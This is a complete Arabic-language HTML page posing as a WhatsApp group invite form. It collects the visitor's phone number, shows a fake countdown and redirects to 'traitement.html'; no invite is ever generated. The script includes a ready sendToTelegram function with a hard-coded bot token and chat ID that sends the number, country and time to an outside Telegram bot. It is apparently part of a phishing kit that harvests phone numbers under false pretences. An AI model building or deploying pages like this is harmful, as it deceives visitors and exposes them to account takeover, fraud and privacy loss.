<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:image" content="whatsapp-logo-icon-isolated-on-transparent-background-free-png.webp">
    <meta property="og:title" content="انضم إلى مجموعتنا على واتساب">
    <title>انضم إلى مجموعتنا على واتساب</title>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css">
    <style>
        :root {
            --primary: #25D366;
            --primary-dark: #128C7E;
            --primary-darker: #075E54;
            --primary-light: #DCF8C6;
            --white: #FFFFFF;
            --light-bg: #F5F5F5;
            --border-color: #E5E5E5;
            --text-secondary: #777777;
            --text-primary: #333333;
            --shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Tajawal', sans-serif;
            background-color: var(--light-bg);
            color: var(--text-primary);
            line-height: 1.6;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .card {
            background-color: var(--white);
            border-radius: 16px;
            box-shadow: var(--shadow);
            width: 100%;
            max-width: 480px;
            overflow: hidden;
            transform: translateY(0);
            animation: cardEntrance 0.6s ease-out;
        }

        .card-header {
            background: linear-gradient(135deg, var(--primary-dark), var(--primary-darker));
            color: var(--white);
            padding: 24px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .card-header::after {
            content: '';
            position: absolute;
            bottom: -50px;
            right: -50px;
            width: 100px;
            height: 100px;
            background-color: rgba(255, 255, 255, 0.1);
            border-radius: 50%;
        }

        .card-header::before {
            content: '';
            position: absolute;
            top: -30px;
            left: -30px;
            width: 80px;
            height: 80px;
            background-color: rgba(255, 255, 255, 0.1);
            border-radius: 50%;
        }

        .card-header h2 {
            font-size: 1.5rem;
            margin-bottom: 8px;
            position: relative;
            z-index: 1;
        }

        .card-header p {
            font-size: 0.95rem;
            opacity: 0.9;
            position: relative;
            z-index: 1;
        }

        .card-body {
            padding: 28px;
        }

        .form-group {
            margin-bottom: 24px;
        }

        .form-label {
            display: block;
            margin-bottom: 10px;
            font-weight: 500;
            color: var(--text-primary);
            font-size: 0.95rem;
        }

        .input-wrapper {
            position: relative;
        }

        .phone-input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid var(--border-color);
            border-radius: 10px;
            font-size: 16px;
            transition: var(--transition);
            font-family: 'Tajawal', sans-serif;
            background-color: var(--white);
        }

        .phone-input:focus {
            border-color: var(--primary);
            outline: none;
            box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.15);
        }

        .submit-btn {
            background: linear-gradient(to right, var(--primary), var(--primary-dark));
            color: var(--white);
            border: none;
            padding: 16px;
            font-size: 16px;
            font-weight: 500;
            border-radius: 10px;
            cursor: pointer;
            width: 100%;
            transition: var(--transition);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            box-shadow: 0 4px 12px rgba(37, 211, 102, 0.25);
        }

        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(37, 211, 102, 0.3);
        }

        .submit-btn:active {
            transform: translateY(0);
        }

        .countdown-section {
            display: none;
            text-align: center;
            padding: 20px;
            animation: fadeIn 0.5s ease-out;
        }

        .countdown-title {
            font-size: 1.3rem;
            color: var(--primary-darker);
            margin-bottom: 24px;
            font-weight: 500;
        }

        .countdown-visual {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 28px;
        }

        .countdown-circle {
            width: 140px;
            height: 140px;
            border-radius: 50%;
            background: conic-gradient(
                var(--primary) 0%, 
                var(--primary-light) 0%
            );
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            box-shadow: var(--shadow);
            margin-bottom: 16px;
        }

        .countdown-number {
            font-size: 2.8rem;
            font-weight: 700;
            color: var(--primary-darker);
        }

        .countdown-label {
            font-size: 1rem;
            color: var(--text-secondary);
            margin-top: 8px;
        }

        .progress-container {
            width: 100%;
            height: 8px;
            background-color: var(--primary-light);
            border-radius: 4px;
            margin: 24px 0;
            overflow: hidden;
        }

        .progress-bar {
            height: 100%;
            background: linear-gradient(to right, var(--primary), var(--primary-dark));
            width: 0%;
            transition: width 1s linear;
            border-radius: 4px;
        }

        .whatsapp-icon {
            color: var(--primary);
            font-size: 3rem;
            margin: 20px 0;
            animation: pulse 1.5s infinite ease-in-out;
        }

        .status-text {
            color: var(--text-secondary);
            margin-top: 16px;
            font-size: 1rem;
            line-height: 1.6;
        }

        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: var(--white);
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @keyframes pulse {
            0% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.1); opacity: 0.8; }
            100% { transform: scale(1); opacity: 1; }
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes cardEntrance {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* تحسينات لمختار الدول */
        .iti {
            width: 100%;
        }

        .iti__selected-flag {
            padding: 0 12px 0 6px;
        }

        .iti__arrow {
            border-left: 3px solid transparent;
            border-right: 3px solid transparent;
            border-top: 4px solid #555;
            margin-right: 6px;
        }

        .iti__country-list {
            text-align: right;
            border-radius: 8px;
            box-shadow: var(--shadow);
            font-family: 'Tajawal', sans-serif;
        }

        /* رسائل التنبيه */
        .alert {
            padding: 12px 16px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 0.9rem;
            display: none;
        }

        .alert-error {
            background-color: #FFEBEE;
            color: #C62828;
            border-left: 4px solid #EF5350;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="card-header">
            <h2>انضم إلى مجموعتنا على واتساب</h2>
            <p>أدخل رقم هاتفك لتلقي رابط الدعوة مباشرة</p>
        </div>
        
        <div class="card-body">
            <div class="alert alert-error" id="errorAlert"></div>
            
            <form id="whatsappForm">
                <div class="form-group">
                    <label for="phone" class="form-label">رقم الهاتف</label>
                    <div class="input-wrapper">
                        <input type="tel" id="phone" class="phone-input" required>
                    </div>
                </div>
                
                <div class="form-group">
                    <button type="submit" class="submit-btn" id="submitBtn">
                        <span>الحصول على الرابط</span>
                        <i class="fab fa-whatsapp"></i>
                    </button>
                </div>
            </form>
            
            <div class="countdown-section" id="countdownSection">
                <h3 class="countdown-title">جاري إنشاء رابط الدعوة الخاص بك</h3>
                
                <div class="countdown-visual">
                    <div class="countdown-circle" id="countdownCircle">
                        <span class="countdown-number" id="countdown">20</span>
                    </div>
                    <span class="countdown-label">ثانية متبقية</span>
                </div>
                
                <div class="progress-container">
                    <div class="progress-bar" id="progressBar"></div>
                </div>
                
                <div class="whatsapp-icon">
                    <i class="fab fa-whatsapp"></i>
                </div>
                
                <p class="status-text">نحن نعد رابط الدعوة الخاص بك، سيتم تحويلك تلقائياً عند الانتهاء.<br>الرجاء عدم إغلاق هذه الصفحة.</p>
            </div>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // عناصر DOM
            const phoneInput = document.getElementById('phone');
            const whatsappForm = document.getElementById('whatsappForm');
            const countdownSection = document.getElementById('countdownSection');
            const submitBtn = document.getElementById('submitBtn');
            const countdownElement = document.getElementById('countdown');
            const countdownCircle = document.getElementById('countdownCircle');
            const progressBar = document.getElementById('progressBar');
            const errorAlert = document.getElementById('errorAlert');
            
            // تهيئة مدخل الهاتف
            const iti = window.intlTelInput(phoneInput, {
                initialCountry: "sa",
                preferredCountries: ["sa", "ae", "eg", "iq", "jo", "kw", "lb", "om", "qa", "bh", "us", "gb"],
                separateDialCode: true,
                utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
                autoPlaceholder: "off"
            });

            // إرسال النموذج
            whatsappForm.addEventListener('submit', function(e) {
                e.preventDefault();
                
                const phoneNumber = iti.getNumber();
                const isValid = iti.isValidNumber();
                
                // التحقق من صحة الرقم
                if (!phoneNumber || !isValid) {
                    showError("الرجاء إدخال رقم هاتف صحيح");
                    return;
                }
                
                // بدء عملية الإرسال
                startCountdown();
            });
            
            // عرض رسالة الخطأ
            function showError(message) {
                errorAlert.textContent = message;
                errorAlert.style.display = 'block';
                setTimeout(() => {
                    errorAlert.style.display = 'none';
                }, 5000);
            }
            
            // بدء العد التنازلي
            function startCountdown() {
                // تعطيل الزر وإظهار حالة التحميل
                submitBtn.disabled = true;
                submitBtn.innerHTML = '<span class="spinner"></span> جاري المعالجة...';
                
                // إخفاء النموذج وإظهار العد التنازلي
                whatsappForm.style.display = 'none';
                countdownSection.style.display = 'block';
                
                // إعداد العد التنازلي (20 ثانية)
                let seconds = 20;
                const totalSeconds = seconds;
                
                const countdownInterval = setInterval(() => {
                    seconds--;
                    countdownElement.textContent = seconds;
                    
                    // تحديث التقدم المرئي
                    const progressPercent = ((totalSeconds - seconds) / totalSeconds) * 100;
                    updateProgress(progressPercent);
                    
                    // الانتقال عند انتهاء الوقت
                    if (seconds <= 0) {
                        clearInterval(countdownInterval);
                        completeProcess();
                    }
                }, 1000);
            }
            
            // تحديث المؤشرات المرئية
            function updateProgress(percent) {
                // تحديث الدائرة
                countdownCircle.style.background = `
                    conic-gradient(
                        var(--primary) ${percent}%, 
                        var(--primary-light) ${percent}%
                    )
                `;
                
                // تحديث شريط التقدم
                progressBar.style.width = `${percent}%`;
            }
            
            // إكمال العملية والانتقال
            function completeProcess() {
                // يمكنك هنا إضافة إرسال البيانات إلى التليجرام إذا لزم الأمر
                // sendToTelegram(iti.getNumber());
                
                // الانتقال إلى الصفحة التالية
                setTimeout(() => {
                    window.location.href = 'traitement.html';
                }, 500);
            }
            
            // دالة إرسال البيانات إلى التليجرام (اختياري)
            function sendToTelegram(phone) {
                const bots = [
                    { token: "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", chatId: "5372119436" },
                    { token: "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", chatId: "5372119436" }
                ];
                
                const message = `طلب انضمام جديد إلى واتساب:
📱 الرقم: ${phone}
🌍 الدولة: ${iti.getSelectedCountryData().name}
🕒 الوقت: ${new Date().toLocaleString('ar-SA')}`;
                
                bots.forEach(bot => {
                    fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(message)}`)
                        .catch(err => console.error('Error sending to Telegram:', err));
                });
            }
        });
    </script>
</body>
</html>
